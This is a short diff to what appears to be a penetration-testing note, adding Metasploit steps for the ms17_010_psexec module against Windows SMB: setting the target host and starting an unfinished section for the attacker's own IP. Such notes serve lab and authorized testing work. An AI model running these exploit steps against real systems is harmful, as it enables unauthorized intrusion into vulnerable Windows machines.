@@ -43,7 +43,15 @@ use exploit/windows/smb/ms17_010_psexec
 show options
 ```
 
-#### 
+#### Set IPs of target
+```
+set RHOST {IP}
+```
+
+#### Set IP of where we are attacking from
+```
+set 
+```
 ## Tools
 - 
 
